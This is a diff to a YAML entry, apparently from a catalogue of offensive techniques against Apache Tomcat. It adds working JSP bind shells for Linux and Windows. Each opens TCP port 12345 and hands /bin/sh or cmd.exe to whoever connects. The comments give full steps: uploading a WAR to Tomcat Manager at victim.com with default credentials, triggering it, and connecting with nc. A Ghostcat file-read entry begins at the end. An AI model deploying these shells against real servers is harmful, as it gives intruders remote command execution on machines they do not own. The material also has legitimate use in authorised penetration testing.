@@ -29,6 +29,53 @@ docker:
     \ > conf/tomcat-users.xml'`\nThen restart the container: `docker compose restart\
     \ tomcat`\n"
 functions:
+  bind-shell:
+  - code: |
+      <%@ page import="java.io.*,java.net.*" %>
+      <%
+      // Deploy this JSP as part of a WAR via Tomcat Manager, then request it to activate.
+      // The page blocks until the client disconnects; the HTTP response does not complete.
+      ServerSocket ss = new ServerSocket(12345);
+      Socket c = ss.accept();
+      Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
+      InputStream pi = p.getInputStream(), si = c.getInputStream();
+      OutputStream po = p.getOutputStream(), so = c.getOutputStream();
+      while (!c.isClosed()) {
+          while (pi.available() > 0) so.write(pi.read());
+          while (si.available() > 0) po.write(si.read());
+          so.flush(); po.flush(); Thread.sleep(50);
+      }
+      p.destroy(); c.close(); ss.close();
+      %>
+    comment: |
+      Opens a bind shell on TCP 12345 via a deployed WAR/JSP using a ServerSocket bridge.
+      The JSP page blocks the HTTP request thread until the client disconnects.
+      Deploy via Tomcat Manager:
+        jar -cf bind.war bind.jsp && curl -u tomcat:tomcat \
+          "http://victim.com:8080/manager/text/deploy?path=/bind" --upload-file bind.war
+      Trigger by requesting: http://victim.com:8080/bind/bind.jsp
+      Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: linux
+    tty: false
+  - code: "<%@ page import=\"java.io.*,java.net.*\" %>\n<%\n// Windows variant \u2014\
+      \ replaces /bin/sh with cmd.exe\nServerSocket ss = new ServerSocket(12345);\n\
+      Socket c = ss.accept();\nProcess p = new ProcessBuilder(\"cmd.exe\").redirectErrorStream(true).start();\n\
+      InputStream pi = p.getInputStream(), si = c.getInputStream();\nOutputStream\
+      \ po = p.getOutputStream(), so = c.getOutputStream();\nwhile (!c.isClosed())\
+      \ {\n    while (pi.available() > 0) so.write(pi.read());\n    while (si.available()\
+      \ > 0) po.write(si.read());\n    so.flush(); po.flush(); Thread.sleep(50);\n\
+      }\np.destroy(); c.close(); ss.close();\n%>\n"
+    comment: "Windows variant \u2014 identical ServerSocket bridge but spawns cmd.exe\
+      \ instead of /bin/sh.\nDeploy and trigger identically to the Linux variant.\n\
+      Connect with: nc victim.com 12345\n"
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: windows
+    tty: false
   file-read:
   - code: |
       # Using the public Ghostcat PoC (github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi):
